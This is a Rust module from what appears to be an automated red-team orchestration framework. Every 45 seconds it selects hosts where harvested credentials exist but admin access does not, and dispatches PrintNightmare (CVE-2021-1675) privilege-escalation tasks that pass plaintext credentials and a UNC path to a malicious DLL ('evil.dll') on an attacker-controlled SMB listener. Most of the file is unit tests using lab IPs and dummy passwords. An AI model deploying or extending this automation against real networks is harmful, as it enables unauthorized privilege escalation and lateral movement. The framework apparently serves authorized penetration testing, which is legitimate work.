//! auto_print_nightmare -- exploit CVE-2021-1675 (PrintNightmare) when
//! conditions are met.
//!
//! PrintNightmare exploits the Print Spooler service to achieve remote code
//! execution. Requires: valid credentials, target with Print Spooler running
//! (most Windows hosts by default), and a writable SMB share for the DLL.
//!
//! This module dispatches `printnightmare` against hosts where we have
//! credentials but NOT admin access — it's a priv esc technique.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Collect PrintNightmare work items from state (pure logic, no async).
fn collect_print_nightmare_work(
    state: &StateInner,
    listener: &str,
    dll_path: &str,
) -> Vec<PrintNightmareWork> {
    if state.credentials.is_empty() {
        return Vec::new();
    }

    let mut items = Vec::new();

    // Target all discovered hosts (DCs + member servers)
    for host in &state.hosts {
        let ip = &host.ip;

        if state.is_processed(DEDUP_PRINTNIGHTMARE, ip) {
            continue;
        }

        // Skip hosts where we already have admin (secretsdump handles those)
        if state.is_processed(DEDUP_SECRETSDUMP, ip) {
            continue;
        }

        // Infer domain from hostname (e.g. "dc01.contoso.local" -> "contoso.local")
        let domain = host
            .hostname
            .find('.')
            .map(|i| host.hostname[i + 1..].to_lowercase())
            .unwrap_or_default();

        let cred = state
            .credentials
            .iter()
            .find(|c| !domain.is_empty() && c.domain.to_lowercase() == domain)
            .or_else(|| state.credentials.first());

        let cred = match cred {
            Some(c) => c.clone(),
            None => continue,
        };

        items.push(PrintNightmareWork {
            target_ip: ip.clone(),
            hostname: host.hostname.clone(),
            domain: domain.clone(),
            listener: listener.to_string(),
            dll_path: dll_path.to_string(),
            credential: cred,
        });
    }

    items
}

/// Monitors for PrintNightmare exploitation opportunities.
/// Only targets hosts we don't already have admin on.
/// Interval: 45s.
pub async fn auto_print_nightmare(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("printnightmare") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue, // need listener for DLL hosting
        };

        // PrintNightmare requires a UNC path to a hosted malicious DLL. Without
        // pre-staged SMB share + payload infra, dispatching is guaranteed to
        // fail on the worker (cve_exploits.rs requires `dll_path`). Skip
        // cleanly when not configured rather than emitting failed tasks.
        let dll_path = match std::env::var("ARES_PRINTNIGHTMARE_DLL").ok() {
            Some(path) if !path.is_empty() => path,
            _ => continue,
        };

        let work: Vec<PrintNightmareWork> = {
            let state = dispatcher.state.read().await;
            collect_print_nightmare_work(&state, &listener, &dll_path)
        };

        for item in work {
            let payload = json!({
                "technique": "printnightmare",
                "target_ip": item.target_ip,
                "hostname": item.hostname,
                "domain": item.domain,
                "listener_ip": item.listener,
                "dll_path": item.dll_path,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("printnightmare");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        target = %item.target_ip,
                        hostname = %item.hostname,
                        "PrintNightmare (CVE-2021-1675) exploitation dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_PRINTNIGHTMARE, item.target_ip.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_PRINTNIGHTMARE, &item.target_ip)
                        .await;
                }
                Ok(None) => {
                    debug!(target = %item.target_ip, "PrintNightmare task deferred");
                }
                Err(e) => {
                    warn!(err = %e, target = %item.target_ip, "Failed to dispatch PrintNightmare");
                }
            }
        }
    }
}

struct PrintNightmareWork {
    target_ip: String,
    hostname: String,
    domain: String,
    listener: String,
    dll_path: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_PRINTNIGHTMARE, "printnightmare");
    }

    #[test]
    fn dedup_key_is_target_ip() {
        let ip = "192.168.58.22";
        assert_eq!(ip, "192.168.58.22");
    }

    #[test]
    fn domain_from_hostname() {
        let hostname = "dc01.contoso.local";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "contoso.local");
    }

    #[test]
    fn domain_from_bare_hostname() {
        let hostname = "dc01";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "");
    }

    #[test]
    fn payload_structure_validation() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let payload = serde_json::json!({
            "technique": "printnightmare",
            "target_ip": "192.168.58.22",
            "hostname": "srv01.contoso.local",
            "domain": "contoso.local",
            "listener_ip": "192.168.58.50",
            "dll_path": "\\\\192.168.58.50\\share\\evil.dll",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });

        assert_eq!(payload["technique"], "printnightmare");
        assert_eq!(payload["target_ip"], "192.168.58.22");
        assert_eq!(payload["hostname"], "srv01.contoso.local");
        assert_eq!(payload["domain"], "contoso.local");
        assert_eq!(payload["listener_ip"], "192.168.58.50");
        assert_eq!(payload["dll_path"], "\\\\192.168.58.50\\share\\evil.dll");
        assert_eq!(payload["credential"]["username"], "admin");
        assert_eq!(payload["credential"]["password"], "P@ssw0rd!"); // pragma: allowlist secret
        assert_eq!(payload["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn work_struct_construction() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "testuser".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let work = PrintNightmareWork {
            target_ip: "192.168.58.22".into(),
            hostname: "srv01.contoso.local".into(),
            domain: "contoso.local".into(),
            listener: "192.168.58.50".into(),
            dll_path: "\\\\192.168.58.50\\share\\evil.dll".into(),
            credential: cred,
        };

        assert_eq!(work.target_ip, "192.168.58.22");
        assert_eq!(work.hostname, "srv01.contoso.local");
        assert_eq!(work.domain, "contoso.local");
        assert_eq!(work.listener, "192.168.58.50");
        assert_eq!(work.credential.username, "testuser");
    }

    #[test]
    fn domain_from_multi_level_hostname() {
        let hostname = "web01.dmz.contoso.local";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "dmz.contoso.local");
    }

    #[test]
    fn domain_from_uppercase_hostname() {
        let hostname = "DC01.CONTOSO.LOCAL";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "contoso.local");
    }

    use crate::orchestrator::state::StateInner;

    fn make_cred(username: &str, domain: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: uuid::Uuid::new_v4().to_string(),
            username: username.to_string(),
            password: "P@ssw0rd!".to_string(), // pragma: allowlist secret
            domain: domain.to_string(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_host(ip: &str, hostname: &str) -> ares_core::models::Host {
        ares_core::models::Host {
            ip: ip.to_string(),
            hostname: hostname.to_string(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        }
    }

    #[test]
    fn collect_empty_state_produces_no_work() {
        let state = StateInner::new("test".into());
        let work = collect_print_nightmare_work(
            &state,
            "192.168.58.50",
            "\\\\192.168.58.50\\share\\evil.dll",
        );
        assert!(work.is_empty());
    }

    #[test]
    fn collect_no_credentials_produces_no_work() {
        let mut state = StateInner::new("test".into());
        state
            .hosts
            .push(make_host("192.168.58.22", "srv01.contoso.local"));
        let work = collect_print_nightmare_work(
            &state,
            "192.168.58.50",
            "\\\\192.168.58.50\\share\\evil.dll",
        );
        assert!(work.is_empty());
    }

    #[test]
    fn collect_host_with_cred_produces_work() {
        let mut state = StateInner::new("test".into());
        state
            .hosts
            .push(make_host("192.168.58.22", "srv01.contoso.local"));
        state.credentials.push(make_cred("admin", "contoso.local"));
        let work = collect_print_nightmare_work(
            &state,
            "192.168.58.50",
            "\\\\192.168.58.50\\share\\evil.dll",
        );
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.22");
        assert_eq!(work[0].hostname, "srv01.contoso.local");
        assert_eq!(work[0].domain, "contoso.local");
        assert_eq!(work[0].listener, "192.168.58.50");
        assert_eq!(work[0].dll_path, "\\\\192.168.58.50\\share\\evil.dll");
        assert_eq!(work[0].credential.username, "admin");
    }

    #[test]
    fn collect_skips_already_processed_printnightmare() {
        let mut state = StateInner::new("test".into());
        state
            .hosts
            .push(make_host("192.168.58.22", "srv01.contoso.local"));
        state.credentials.push(make_cred("admin", "contoso.local"));
        state.mark_processed(DEDUP_PRINTNIGHTMARE, "192.168.58.22".into());
        let work = collect_print_nightmare_work(
            &state,
            "192.168.58.50",
            "\\\\192.168.58.50\\share\\evil.dll",
        );
        assert!(work.is_empty());
    }

    #[test]
    fn collect_skips_already_secretsdumped_host() {
        let mut state = StateInner::new("test".into());
        state
            .hosts
            .push(make_host("192.168.58.22", "srv01.contoso.local"));
        state.credentials.push(make_cred("admin", "contoso.local"));
        state.mark_processed(DEDUP_SECRETSDUMP, "192.168.58.22".into());
        let work = collect_print_nightmare_work(
            &state,
            "192.168.58.50",
            "\\\\192.168.58.50\\share\\evil.dll",
        );
        assert!(work.is_empty());
    }

    #[test]
    fn collect_prefers_same_domain_credential() {
        let mut state = StateInner::new("test".into());
        state
            .hosts
            .push(make_host("192.168.58.22", "srv01.contoso.local"));
        state
            .credentials
            .push(make_cred("fab_user", "fabrikam.local"));
        state
            .credentials
            .push(make_cred("con_user", "contoso.local"));
        let work = collect_print_nightmare_work(
            &state,
            "192.168.58.50",
            "\\\\192.168.58.50\\share\\evil.dll",
        );
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].credential.username, "con_user");
    }

    #[test]
    fn collect_falls_back_to_first_cred_for_bare_hostname() {
        let mut state = StateInner::new("test".into());
        state.hosts.push(make_host("192.168.58.22", "srv01"));
        state
            .credentials
            .push(make_cred("fallback", "contoso.local"));
        let work = collect_print_nightmare_work(
            &state,
            "192.168.58.50",
            "\\\\192.168.58.50\\share\\evil.dll",
        );
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].credential.username, "fallback");
        assert_eq!(work[0].domain, "");
    }

    #[test]
    fn collect_multiple_hosts_mixed() {
        let mut state = StateInner::new("test".into());
        state
            .hosts
            .push(make_host("192.168.58.22", "srv01.contoso.local"));
        state
            .hosts
            .push(make_host("192.168.58.30", "ws01.fabrikam.local"));
        state.credentials.push(make_cred("admin", "contoso.local"));
        // Mark second host as already secretsdumped
        state.mark_processed(DEDUP_SECRETSDUMP, "192.168.58.30".into());
        let work = collect_print_nightmare_work(
            &state,
            "192.168.58.50",
            "\\\\192.168.58.50\\share\\evil.dll",
        );
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.22");
    }

    #[test]
    fn dedup_key_format_validation() {
        // PrintNightmare uses the raw target_ip as dedup key
        let ip = "192.168.58.10";
        // The dedup key is just the IP itself
        assert_eq!(ip, "192.168.58.10");
        assert!(!ip.contains(':'));
    }
}
